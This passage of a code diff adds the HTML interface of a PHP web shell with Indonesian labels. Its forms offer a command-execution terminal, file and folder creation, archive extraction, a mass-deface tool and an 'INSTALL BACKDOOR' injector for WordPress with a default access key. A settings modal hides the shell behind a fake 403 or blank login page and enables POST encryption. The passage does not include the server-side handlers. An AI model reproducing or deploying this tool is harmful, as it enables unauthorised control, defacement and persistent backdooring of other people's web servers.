+</div>
+        <div class="tool">
+            <label>BUAT FILE BARU</label>
+            <form method="post">
+                <input type="text" name="new_file" placeholder="nama_file.php">
+                <button type="submit" name="action" value="CreateFile">BUAT</button>
+            </form>
+        </div>
+        <div class="tool">
+            <label>BUAT FOLDER</label>
+            <form method="post">
+                <input type="text" name="new_folder" placeholder="nama_folder">
+                <button type="submit" name="action" value="CreateFolder">BUAT</button>
+            </form>
+        </div>
+        <div class="tool">
+            <label>TERMINAL</label>
+            <form method="post">
+                <input type="text" name="command" placeholder="whoami && id" style="width:300px;">
+                <button type="submit" name="action" value="Execute">EXECUTE</button>
+            </form>
+        </div>
+        <div class="tool">
+            <label>EXTRACT ARCHIVE</label>
+            <form method="post">
+                <input type="text" name="archive_file" placeholder="namafile.zip">
+                <button type="submit" name="action" value="ExtractArchive">EXTRACT</button>
+            </form>
+        </div>
+        <div class="tool">
+            <label>MASS DEFACE</label>
+            <form method="post">
+                <textarea name="deface_content" placeholder="Kode deface" rows="5" style="width:260px;"></textarea>
+                <button type="submit" name="action" value="MassDeface">JALANKAN</button>
+            </form>
+        </div>
+        <div class="tool">
+            <label>INSTALL BACKDOOR</label>
+            <form method="post">
+                <select name="cms">
+                    <option value="wordpress">WordPress</option>
+                </select><br>
+                <input type="text" name="fullpath" placeholder="/var/www/.../keje.php" required style="width:300px;"><br>
+                <input type="text" name="key" placeholder="keje666" value="keje666" required><br>
+                <small style="color:#ff0;">Akses: file.php?keje666</small><br>
+                <button type="submit" name="action" value="InstallBackdoor">INJECT</button>
+            </form>
+        </div>
+    </div>
+</div>
+<!-- OVERLAY GELAP (klik luar tutup popup) -->
+<div class="overlay" id="kejeOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:999;" 
+     onclick="document.getElementById('kejeSettingsModal').style.display='none'; this.style.display='none';"></div>
+
+<!-- MODAL POPUP KEJE SETTINGS -->
+<div class="modal" id="kejeSettingsModal" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:#000; border:3px solid #0f0; padding:30px; width:90%; max-width:650px; z-index:1000; box-shadow:0 0 40px #0f0; text-align:left;">
+    <h2 style="color:#ff0; text-align:center; margin:0 0 20px 0;">KEJE SETTINGS - PROTECT SHELL LU BRO!</h2>
+    <form method="post">
+        <label style="color:#0f0; display:block; margin:10px 0 5px;">Protect Shell:</label>
+        <select name="protect" style="width:100%; padding:8px; background:#111; color:#0f0; border:1px solid #0f0;">
+            <option value="No">No</option>
+            <option value="Yes">Yes</option>
+        </select>
+
+        <label style="color:#0f0; display:block; margin:10px 0 5px;">CGI Api:</label>
+        <select name="cgi_api" style="width:100%; padding:8px; background:#111; color:#0f0; border:1px solid #0f0;">
+            <option value="Yes">Yes</option>
+            <option value="No">No</option>
+        </select>
+
+        <label style="color:#0f0; display:block; margin:10px 0 5px;">Post Encryption:</label>
+        <select name="post_enc" style="width:100%; padding:8px; background:#111; color:#0f0; border:1px solid #0f0;">
+            <option value="No">No</option>
+            <option value="Yes">Yes</option>
+        </select>
+
+        <label style="color:#0f0; display:block; margin:10px 0 5px;">Show Icons:</label>
+        <select name="show_icons" style="width:100%; padding:8px; background:#111; color:#0f0; border:1px solid #0f0;">
+            <option value="Yes">Yes</option>
+            <option value="No">No</option>
+        </select>
+
+        <label style="color:#0f0; display:block; margin:10px 0 5px;">Login Page:</label>
+        <select name="login_page" style="width:100%; padding:8px; background:#111; color:#0f0; border:1px solid #0f0;">
+            <option value="403 Forbidden">403 Forbidden</option>
+            <option value="Blank Page">Blank Page</option>
+            <option value="Custom">Custom</option>
+        </select>
+
+        <label style="color:#0f0; display:block; margin:10px 0 5px;">Username:</label>
+        <input type="text" name="username" placeholder="masukin username lu" value="hacker" required style="width:100%; padding:8px; background:#111; color:#0f0; border:1px solid #0f0;">
+
+        <label style="color:#0f0; display:block; margin:10px 0 5px;">Password:</label>
+        <input type="password" name="password" placeholder="gasken bro" required style="width:100%; padding:8px; background:#111; color:#0f0; border:1px solid #0f0;">
+
+        <div style="margin-top:20px; text-align:center;">
+            <button type="submit" name="action" value="SaveKejeSettings" style="padding:12px 40px; background:#0f0; color:#000; font-weight:bold; border:none; cursor:pointer; box-shadow:0 0 15px #0f0;">
+                SAVE SETTINGS
+            </button>
+            <button type="button" onclick="document.getElementById('kejeSettingsModal').style.display='none'; document.getElementById('kejeOverlay').style.display='none';" 
+                    style="padding:12px 40px; background:#f00; color:#fff; border:none; cursor:pointer; margin-left:20px;">
+                CLOSE
+            </button>
+        </div>
+    </form>
+</div>
+</body>
+</html>
